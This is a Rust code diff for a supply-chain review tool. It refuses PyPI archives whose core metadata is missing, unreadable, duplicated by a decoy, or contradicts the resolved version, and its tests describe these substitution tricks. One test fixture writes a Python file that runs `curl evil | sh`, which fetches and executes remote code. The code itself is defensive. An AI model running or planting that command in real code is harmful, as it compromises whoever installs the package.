@@ -492,31 +492,79 @@ fn collect_install_refs(
     }
 }
 
-/// Locate a PyPI artifact's core metadata. PEP 427 puts a wheel's at
-/// `<name>-<version>.dist-info/METADATA`, `.egg-info` predates it, and an sdist
-/// carries `PKG-INFO` at the root of its single top-level directory. `None`
-/// when no metadata is found; the caller decides what that means.
-fn find_pypi_metadata(root: &std::path::Path) -> Option<std::path::PathBuf> {
-    for path in [root.join("METADATA"), root.join("PKG-INFO")] {
-        if path.is_file() {
-            return Some(path);
-        }
-    }
-    // One level down, which is where a wheel's dist-info and an sdist's single
-    // top-level directory both put it. A wheel has exactly one, so sorting makes
-    // the choice deterministic rather than readdir order.
-    let mut found: Vec<std::path::PathBuf> = std::fs::read_dir(root)
-        .ok()?
-        .flatten()
-        .filter(|entry| entry.path().is_dir())
-        .flat_map(|entry| {
-            let dir = entry.path();
-            [dir.join("METADATA"), dir.join("PKG-INFO")]
-        })
+/// Every location a PyPI artifact's core metadata can legitimately sit at. PEP
+/// 427 puts a wheel's at `<name>-<version>.dist-info/METADATA`, `.egg-info`
+/// predates it, and an sdist carries `PKG-INFO` at the root of its single
+/// top-level directory.
+///
+/// All of them are returned rather than the first. `pip` installs the metadata
+/// that belongs to the distribution, so an archive carrying two leaves the
+/// choice of which one the review reads, and which one the installer reads, up
+/// to whoever built the archive. The caller refuses on anything but exactly one.
+fn pypi_metadata_candidates(root: &std::path::Path) -> Vec<std::path::PathBuf> {
+    let mut found: Vec<std::path::PathBuf> = [root.join("METADATA"), root.join("PKG-INFO")]
+        .into_iter()
         .filter(|path| path.is_file())
         .collect();
+    // One level down, which is where a wheel's dist-info and an sdist's single
+    // top-level directory both put it.
+    if let Ok(entries) = std::fs::read_dir(root) {
+        found.extend(
+            entries
+                .flatten()
+                .filter(|entry| entry.path().is_dir())
+                .flat_map(|entry| {
+                    let dir = entry.path();
+                    [dir.join("METADATA"), dir.join("PKG-INFO")]
+                })
+                .filter(|path| path.is_file()),
+        );
+    }
     found.sort();
-    found.into_iter().next()
+    found.dedup();
+    found
+}
+
+/// The fields of core metadata this review binds to, read strictly. A field the
+/// artifact does not carry is `None`, never a default: every use of it below is
+/// a comparison against what the registry resolved, and a synthesized value
+/// compares equal to itself by construction.
+struct PypiCoreMetadata {
+    name: Option<String>,
+    version: Option<String>,
+    dependencies: std::collections::BTreeMap<String, String>,
+}
+
+fn parse_pypi_core_metadata(raw: &str) -> PypiCoreMetadata {
+    let mut parsed = PypiCoreMetadata {
+        name: None,
+        version: None,
+        dependencies: std::collections::BTreeMap::new(),
+    };
+    for line in raw.lines() {
+        if let Some(rest) = line.strip_prefix("Requires-Dist:") {
+            let dep = rest.trim().split(';').next().unwrap_or("").trim();
+            if !dep.is_empty() {
+                let name = dep.split_whitespace().next().unwrap_or(dep).to_string();
+                parsed.dependencies.insert(name, dep.to_string());
+            }
+        } else if parsed.name.is_none()
+            && let Some(rest) = line.strip_prefix("Name:")
+        {
+            let value = rest.trim();
+            if !value.is_empty() {
+                parsed.name = Some(value.to_string());
+            }
+        } else if parsed.version.is_none()
+            && let Some(rest) = line.strip_prefix("Version:")
+        {
+            let value = rest.trim();
+            if !value.is_empty() {
+                parsed.version = Some(value.to_string());
+            }
+        }
+    }
+    parsed
 }
 
 fn extract_for_ecosystem(
@@ -585,37 +633,82 @@ fn prepare_extracted_root(
             // the read silently failed and PyPI dependencies were always empty:
             // R04_DEPENDENCY_ADDED and R04_DEPENDENCY_MODIFIED could not fire on
             // a wheel or an sdist at all.
-            let candidate = find_pypi_metadata(&root);
-            let mut deps = std::collections::BTreeMap::new();
-            // The declared `Name`, kept so the archive-identity guard below can
-            // compare it against the name the registry resolved.
-            let mut declared_name: Option<String> = None;
-            if let Some(meta) = &candidate
-                && let Ok(raw) = std::fs::read_to_string(meta)
-            {
-                for line in raw.lines() {
-                    if let Some(rest) = line.strip_prefix("Requires-Dist:") {
-                        let dep = rest.trim().split(';').next().unwrap_or("").trim();
-                        if !dep.is_empty() {
-                            let name = dep.split_whitespace().next().unwrap_or(dep).to_string();
-                            deps.insert(name.clone(), dep.to_string());
-                        }
-                    } else if declared_name.is_none()
-                        && let Some(rest) = line.strip_prefix("Name:")
-                    {
-                        let value = rest.trim();
-                        if !value.is_empty() {
-                            declared_name = Some(value.to_string());
-                        }
-                    }
-                }
+            //
+            // Every way that read could come back empty or unusable is now a
+            // refusal rather than a fallback. The arm used to synthesize the
+            // name from the resolved name and the version from the requested
+            // version, and the archive-identity guard below then compared each
+            // against itself, so it could not fire on either fallback path: a
+            // wheel with no metadata, with a non-UTF-8 one, with a decoy
+            // metadata directory sorting ahead of the real one, or with a
+            // `Version:` contradicting the resolved version, was reviewed as a
+            // confident zero-dependency package under the resolved name while
+            // the installed bytes were the attacker's.
+            let refuse = |detail: String| {
+                crate::error::BluelineError::Manifest(
+                    canonical_name.to_string(),
+                    format!("{detail}; refusing to review"),
+                )
+            };
+            let candidates = pypi_metadata_candidates(&root);
+            let [meta] = candidates.as_slice() else {
+                return Err(if candidates.is_empty() {
+                    refuse(
+                        "archive carries no core metadata (no METADATA or PKG-INFO at its \
+                         root or one level down)"
+                            .to_string(),
+                    )
+                } else {
+                    refuse(format!(
+                        "archive carries {} core metadata files ({}); the installed \
+                         distribution is not determined by the archive alone",
+                        candidates.len(),
+                        candidates
+                            .iter()
+                            .map(|p| { p.strip_prefix(&root).unwrap_or(p).display().to_string() })
+                            .collect::<Vec<_>>()
+                            .join(", ")
+                    ))
+                });
+            };
+            let raw = std::fs::read_to_string(meta).map_err(|e| {
+                refuse(format!(
+                    "core metadata `{}` is unreadable: {e}",
+                    meta.display()
+                ))
+            })?;
+            let core = parse_pypi_core_metadata(&raw);
+
+            let declared_name = core.name.ok_or_else(|| {
+                refuse(format!(
+                    "core metadata `{}` declares no name",
+                    meta.display()
+                ))
+            })?;
+            let declared_version = core.version.ok_or_else(|| {
+                refuse(format!(
+                    "core metadata `{}` declares no version",
+                    meta.display()
+                ))
+            })?;
+            // The version the registry resolved is the one the baseline, the
+            // allowlist and every downstream rule key on. A metadata that
+            // declares a different one is a package whose contents are not the
+            // release under review.
+            let parsed_declared = crate::version::Pep440Version::parse(&declared_version)
+                .map_err(|e| refuse(format!("declared version `{declared_version}`: {e}")))?;
+            let resolved = crate::version::Pep440Version::parse(version)
+                .map_err(|e| refuse(format!("resolved version `{version}`: {e}")))?;
+            if parsed_declared != resolved {
+                return Err(refuse(format!(
+                    "core metadata declares version `{declared_version}` but the review \
+                     resolved `{version}`"
+                )));
             }
             crate::manifest::PackageJson {
-                name: declared_name
-                    .clone()
-                    .unwrap_or_else(|| canonical_name.to_string()),
-                version: version.to_string(),
-                dependencies: deps,
+                name: declared_name,
+                version: declared_version,
+                dependencies: core.dependencies,
                 ..Default::default()
             }
         }
@@ -1595,6 +1688,153 @@ mod tests {
 
             prepare_extracted_root(dir.path(), Ecosystem::PyPi, "good-lib", "1.0.0")
                 .unwrap_or_else(|e| panic!("`{declared}` is the same project as `good-lib`: {e}"));
+        }
+    }
+
+    /// `a_pypi_archive_declaring_another_project_is_refused` covers the one path
+    /// where the metadata *is* read and *does* declare a name. The other three
+    /// ways the read could come back empty or unusable all resolved to a
+    /// confident identity: the arm fell back to the resolved name and the
+    /// requested version, so the guard below compared each against itself and
+    /// the review finished `Ok` with zero dependencies. R04 cannot fire on an
+    /// empty dependency set, so each of these is a silent pass over an archive
+    /// whose declared identity was never established.
+    #[test]
+    fn a_pypi_archive_whose_metadata_cannot_be_read_is_refused() {
+        // No metadata at all: a wheel holding only the payload.
+        let no_metadata = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(no_metadata.path().join("evil_pkg")).unwrap();
+        std::fs::write(
+            no_metadata.path().join("evil_pkg/__init__.py"),
+            "import os\nos.system('curl evil | sh')\n",
+        )
+        .unwrap();
+        let err = prepare_extracted_root(no_metadata.path(), Ecosystem::PyPi, "good-lib", "1.0.0")
+            .expect_err("an archive with no core metadata declares no identity");
+        assert!(
+            format!("{err}").contains("no core metadata"),
+            "the refusal must say the metadata was absent: {err}"
+        );
+
+        // Metadata present but not UTF-8, so the read fails.
+        let non_utf8 = tempfile::tempdir().unwrap();
+        let meta_dir = non_utf8.path().join("good_lib-1.0.0.dist-info");
+        std::fs::create_dir_all(&meta_dir).unwrap();
+        let mut raw = b"Metadata-Version: 2.1\nName: evil\nVersion: 1.0.0\n".to_vec();
+        raw.push(0xff);
+        std::fs::write(meta_dir.join("METADATA"), &raw).unwrap();
+        let err = prepare_extracted_root(non_utf8.path(), Ecosystem::PyPi, "good-lib", "1.0.0")
+            .expect_err("metadata that cannot be read as text declares no identity");
+        assert!(
+            format!("{err}").contains("unreadable"),
+            "the refusal must say the metadata was unreadable: {err}"
+        );
+
+        // Metadata present but declaring no name, and declaring no version. Both
+        // are fields every core-metadata document is required to carry.
+        for (field, label) in [("", "no name"), ("Name: good-lib\n", "no version")] {
+            let dir = tempfile::tempdir().unwrap();
+            let meta_dir = dir.path().join("good_lib-1.0.0.dist-info");
+            std::fs::create_dir_all(&meta_dir).unwrap();
+            let body = if field.is_empty() {
+                "Metadata-Version: 2.1\nRequires-Dist: requests >= 2.0\n".to_string()
+            } else {
+                format!("Metadata-Version: 2.1\n{field}")
+            };
+            std::fs::write(meta_dir.join("METADATA"), body).unwrap();
+            let err = prepare_extracted_root(dir.path(), Ecosystem::PyPi, "good-lib", "1.0.0")
+                .expect_err("metadata missing a mandatory field declares no identity");
+            assert!(
+                format!("{err}").contains(label),
+                "the refusal must name the missing field ({label}): {err}"
+            );
+        }
+    }
+
+    /// `find_pypi_metadata` sorted its candidates and returned the first, so an
+    /// archive could ship a decoy that sorts ahead of the metadata pip actually
+    /// installs. The review then read the decoy and ignored the real one, which
+    /// is the same substitution as an archive declaring another name, reached
+    /// without contradicting anything the resolver said.
+    #[test]
+    fn a_pypi_archive_with_two_metadata_files_is_refused() {
+        let dir = tempfile::tempdir().unwrap();
+        for (dist_info, declared) in [
+            ("aaa_good_lib-1.0.0.dist-info", "good-lib"),
+            ("evil-1.0.0.dist-info", "evil"),
+        ] {
+            let meta_dir = dir.path().join(dist_info);
+            std::fs::create_dir_all(&meta_dir).unwrap();
+            std::fs::write(
+                meta_dir.join("METADATA"),
+                format!("Metadata-Version: 2.1\nName: {declared}\nVersion: 1.0.0\n"),
+            )
+            .unwrap();
+        }
+
+        let err = prepare_extracted_root(dir.path(), Ecosystem::PyPi, "good-lib", "1.0.0")
+            .expect_err("two metadata files leave the installed one undetermined");
+        let text = format!("{err}");
+        assert!(
+            text.contains("2 core metadata files"),
+            "the refusal must say how many candidates there were: {err}"
+        );
+        for path in [
+            "aaa_good_lib-1.0.0.dist-info/METADATA",
+            "evil-1.0.0.dist-info/METADATA",
+        ] {
+            assert!(
+                text.contains(path),
+                "the refusal must name each candidate so the operator can see which one \
+                 pip would install: {err}"
+            );
+        }
+    }
+
+    /// The version the registry resolved is what the baseline, the allowlist and
+    /// every downstream rule key on, and it was synthesized into the manifest
+    /// without ever being compared against the archive. A wheel served for
+    /// `good-lib==1.0.0` whose metadata declares `9.9.9` was reviewed as
+    /// `1.0.0`.
+    #[test]
+    fn a_pypi_archive_contradicting_the_resolved_version_is_refused() {
+        let dir = tempfile::tempdir().unwrap();
+        let meta_dir = dir.path().join("good_lib-1.0.0.dist-info");
+        std::fs::create_dir_all(&meta_dir).unwrap();
+        std::fs::write(
+            meta_dir.join("METADATA"),
+            "Metadata-Version: 2.1\nName: good-lib\nVersion: 9.9.9\n",
+        )
+        .unwrap();
+
+        let err = prepare_extracted_root(dir.path(), Ecosystem::PyPi, "good-lib", "1.0.0")
+            .expect_err("a metadata version contradicting the review must be refused");
+        let text = format!("{err}");
+        assert!(
+            text.contains("9.9.9") && text.contains("1.0.0"),
+            "the refusal must name both versions: {err}"
+        );
+    }
+
+    /// The version binding must not refuse an honest release, which is what makes
+    /// it a comparison rather than a refusal. PEP 440 equality, not string
+    /// equality: `1.0`, `1.0.0` and `1.0.0.0` are one release.
+    #[test]
+    fn an_equivalent_pypi_version_is_still_accepted() {
+        for declared in ["1.0.0", "1.0", "1.0.0.0"] {
+            let dir = tempfile::tempdir().unwrap();
+            let meta_dir = dir.path().join("good_lib-1.0.0.dist-info");
+            std::fs::create_dir_all(&meta_dir).unwrap();
+            std::fs::write(
+                meta_dir.join("METADATA"),
+                format!("Metadata-Version: 2.1\nName: good-lib\nVersion: {declared}\n"),
+            )
+            .unwrap();
+
+            let (_root, manifest) =
+                prepare_extracted_root(dir.path(), Ecosystem::PyPi, "good-lib", "1.0.0")
+                    .unwrap_or_else(|e| panic!("`{declared}` is the same release as 1.0.0: {e}"));
+            assert_eq!(manifest.version, declared);
         }
     }
 
